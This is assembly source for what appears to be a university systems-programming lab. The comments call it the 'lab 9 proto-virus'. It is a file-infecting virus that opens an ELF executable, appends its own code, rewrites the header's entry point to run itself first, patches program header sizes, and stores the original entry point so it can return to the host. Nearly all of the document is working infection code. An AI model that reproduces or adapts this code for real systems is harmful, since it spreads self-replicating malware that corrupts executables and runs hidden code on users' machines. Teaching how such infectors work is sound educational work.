%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define entry_ptr 0x08048000
	
	global _start
	section .data

		entry_off: dd 0
		phdr_off: dd 0
	section .text

_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here
virus:
		
	call get_my_loc             
	mov ebx, next_i
	sub ebx, virus_out
	add ecx, virus_out-next_i        
	write 1,ecx,19
main:
	mov eax,FileName

	open eax,RDWR,777
	cmp eax,0
	jl filewonto
	mov [ebp-8],eax
	;jmp infection
	


	


	
infection:

	writeVir: lseek [ebp-8], 0, SEEK_END
		mov [ebp - 16], eax
		;call get_my_loc
		;add ecx, virus_end-next_i
		mov eax,virus_end ;ecx
		call get_my_loc
		add ecx, _start-next_i
		sub eax,ecx
		write [ebp-8],ecx,eax
	updateEntry:
		lseek [ebp-8],0,SEEK_SET
		mov eax,ebp
		sub eax,16
		sub eax,52
		read [ebp-8], eax, 52
		mov eax,entry_ptr
		add eax, [ebp-16]
		mov ecx,[ebp - 52 - 16 + ENTRY]
		mov [ebp-4],ecx
		mov [ebp - 52 - 16 + ENTRY], eax
		lseek [ebp-8], 0, SEEK_SET
		mov ecx,ebp
		sub ecx,52+16
		write [ebp-8], ecx, 52
		
writeprev:		
		lseek [ebp-8], -4, SEEK_END
		mov ecx,ebp
		sub ecx,4
		write [ebp-8],ecx , 4
		lseek [ebp-8], 52, SEEK_SET
		mov ecx,ebp
		sub ecx,8
		sub ecx,32
		read [ebp-8],ecx,32
		mov eax,[ebp-8]
		add eax, virus_end-next_i
		sub eax,52
		mov [ebp-8-32+20],eax
		mov [ebp-8-32+16],eax
		mov ecx,ebp
		sub ecx,8
		sub ecx,32
		write [ebp-8],ecx,32
		lseek [ebp-8], 52, SEEK_SET
		mov ecx,ebp
		sub ecx,8
		sub ecx,32
		read [ebp-8],ecx,32
		mov eax,[ebp-8]
		add eax, virus_end-next_i
		sub eax,84
		mov [ebp-8-32+20],eax
		mov [ebp-8-32+16],eax
		mov ecx,ebp
		sub ecx,8
		sub ecx,32
		write [ebp-8],ecx,32
		close [ebp-8]
		jmp VirusExit

filewonto:
		call get_my_loc
		add ecx,PreviousEntryPoint-next_i
		jmp [ecx]

error:
	exit 55
            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

get_my_loc:                 
        call next_i
next_i:
        pop ecx
        ret
FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
virus_out:		db "hello i'm a virus",10,0
VirusExit:
	
       exit 0

PreviousEntryPoint: dd VirusExit

virus_end: